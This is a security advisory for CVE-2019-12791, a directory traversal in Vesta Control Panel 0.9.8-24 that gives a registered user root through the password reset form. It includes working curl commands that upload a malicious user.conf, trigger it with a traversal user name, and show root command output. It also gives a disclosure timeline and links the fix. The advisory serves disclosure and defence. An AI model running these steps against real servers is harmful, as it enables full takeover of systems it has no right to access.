---
title: '[CVE-2019-12791] Vesta Control Panel 0.9.8-24 — Privilege escalation in the password reset form'
description: Privilege escalation to root can be achieved by a regular user via the password reset form exploiting a directory traversal vulnerability.
tags: [Vesta Control Panel, Privilege escalation, password reset]
advisory:
  discovered: 2019-04-17
  product: '[Vesta Control Panel](https://vestacp.com/)'
  versions:
    - 0.9.8-24
  cve: CVE-2019-12791
---

## Abstract

The insufficient input sanitization used by the `v-list-user` shell utility allows to perform directory traversal and execute shell files as `root` anywhere in the file system but with a fixed file name.

This coupled with the legitimate ability of registered users to upload files in certain locations on the server grants an attacker the ability to perform privilege escalation from a registered user to `root` by simply requesting a password reset.

[HestiaCP](https://www.hestiacp.com/) (an actively maintained fork of VestaCP) version 1.0.4 is also vulnerable but a fix has been promptly deployed in version 1.0.5.

## Details

The `v-list-user` script accepts an user name as an argument then evaluates the `$VESTA/data/users/$user/user.conf` file and prints some values:[^vesta-variable]

```sh
source $VESTA/data/users/$user/user.conf
```

The only check that is performed against the user name is `is_object_valid 'user' 'USER' "$user"` which basically checks that the path `$VESTA/data/users/$user` is a valid directory. So if `../../../../../tmp` is passed as user name then the file `/tmp/user.conf` is evaluated.[^any-writable]

A registered user can upload files on the server using the `/upload/` endpoint. The following is used to upload the proof script to `/tmp/user.conf`:

```console
$ PHPSESSID=... # grab it from an authenticated regular user session
$ COMMAND='id > /usr/local/vesta/web/proof'
$ echo "$COMMAND" | curl -sk -o /dev/null \
    'https://target.com:8083/upload/?dir=/tmp' \
    -b "PHPSESSID=$PHPSESSID" \
    -F 'files=@-;filename=user.conf'
```

It is then possible to invoke the `v-list-user` utility by requesting a password reset:

```console
$ curl -k https://target.com:8083/reset/ -d 'user=../../../../../tmp'
```

In VestaCP the web server is run by the `admin` user and the password reset page executes the `v-list-user` script with `sudo` thus the `user.conf` is evaluated by `root`.

Check that the proof file is created in the web server root:

```console
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)
```

[^any-writable]: Any other writable location can be used, e.g., the user home directory.

[^vesta-variable]: `$VESTA` is usually set to `/usr/local/vesta/`.

## Timeline

2019-05-28
: Disclosed to the VestaCP team.

2019-06-10
: MITRE assigns [{{ page.advisory.cve }}](https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ page.advisory.cve }}) to this vulnerability.

2019-07-29
: Final warning via [GitHub issue](https://github.com/serghey-rodin/vesta/issues/1921) since emails have been ignored.

2019-07-30
: The VestaCP author asks one more week to fix the issue and publish a new release.

2019-07-31
: The VestaCP team [fixes](https://github.com/serghey-rodin/vesta/commit/bb44f4197b4e5de219bc00197f89517c7e92bc2a) the vulnerability.
